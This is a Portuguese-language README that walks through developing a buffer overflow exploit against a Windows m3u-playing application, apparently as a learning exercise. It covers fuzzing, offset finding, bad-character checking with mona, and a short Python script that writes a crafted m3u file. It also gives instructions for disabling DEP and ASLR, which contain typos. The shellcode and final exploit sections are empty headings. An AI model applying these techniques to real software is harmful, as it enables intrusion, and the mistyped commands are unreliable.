# Vuln
buffer overflow

1. Identificar a vulnerabilidade - OK
   
	1.1 - Black Box (fuzzing) - OK
   	1.2 - Reversing - OK
	
3. Verificar quantos bytes são necessários para chegar no RET

. 
primeiros passos depurando a aplicação vulnerável, através do dbg rodamos a aplicação e selecionamos o arquivo m3u modificado com 4000 chars, ao rodarmos acontece uma exceção como visto na imagem do x32 dbg!

![Screenshot from 2023-08-14 22-40-47](https://github.com/igusil/buff3r_ov3rflow/assets/89313216/d17452de-47f3-4544-b07c-1b91799423c8)

   
	2.1 - https://wiremask.eu/tools/buffer-overflow-pattern-generator
 
 ![Screenshot from 2023-08-14 22-10-21](https://github.com/igusil/buff3r_ov3rflow/assets/89313216/73ca66c2-014c-4731-9e24-222a1e3fccce)

	
	2.2 - Metasploit

![Screenshot from 2023-08-14 22-08-15](https://github.com/igusil/buff3r_ov3rflow/assets/89313216/796abfe1-d62b-4160-83a4-11b7af56e7e3)

O pattern generator do msf foi usado para gerar 2000 bytes como exemplo de que pode ser feito por esta ferramenta:

![Screenshot from 2023-08-14 22-08-36](https://github.com/igusil/buff3r_ov3rflow/assets/89313216/3693beaf-932c-40be-8b10-abe679643fdf)


O resultado a partir do EIP 0x68423768 mostrado na primeira imagem do debugger IDA pro, indica que precisamos de 1012 bytes para atingir o retorno, o mesmo resultado pode ser obtido pelo site buffer overflow pattern generator

![Screenshot from 2023-08-14 22-18-16](https://github.com/igusil/buff3r_ov3rflow/assets/89313216/bd9738eb-d92f-4a6c-88c4-32417da27727)




	
3. Verificar "bad bytes"
. Usei o immunity debugger neste passo:

após realizar a instalação do immunity, realize a copia do arquivo mona.py para o diretorio C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
o script python está disponivel para download aqui no repositório.

abra o immunity, rode a aplicação vulneravél usada como exemplo aqui e digite { !mona bytearray } sem chaves, irá gerar um pattern de 00 a ff:

![Screenshot from 2023-08-15 23-20-35](https://github.com/igusil/buff3r_ov3rflow/assets/89313216/961416e2-bfc4-4689-9414-9dbb28b8e5ba)

O codigo em python a seguir foi desenvolvido para gerar um exploit com os bad bytes mostrados no debugger

3.1

lixo = 'A' * 1012
ret = 'AAAA'
badbytes = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

f = open("xpl.m3u", "wb")

f.write(lixo+ret+badbytes)

f.close()


Rodamos o programa vuln com play 2x e abrimos nosso exploit, irá dar exceção e prossiga com Shit + f9
ECX, EBP e EIP será sobreescrito com 41414141,

![Screenshot from 2023-08-19 22-58-35](https://github.com/igusil/buff3r_ov3rflow/assets/89313216/d9abb8ce-36ca-4115-8667-be7dbc14bf8d)


ESP estava em 0018E998, prossiga com o comando

!mona compare -f bytearray.bin -a 0018E998

![Screenshot from 2023-08-19 23-57-01](https://github.com/igusil/buff3r_ov3rflow/assets/89313216/433f095a-8e8e-4142-a7a5-52e744fd3cb9)

o resultado informa que a corrupção ocorreu após 1 byte

3.2 


7. Criar shellcode sem os bad bytes

8. Verificar como chamar o shellcode

6.Exploit


Ps.: Desativar o DEP (Data Execution Prevention) e ASLR (Address Space Layout Randomization)

DEP: cli como admin e digite: bdcedit.exe /set {current} nx AlwaysOff

ASLR: abra o regedit e busca [HKLM\System\Current\CurrentControlSet\Control\Session Manager\Memory Management\]
cria um novo valor "DWORD" com nome "MoveImages" com valor 0



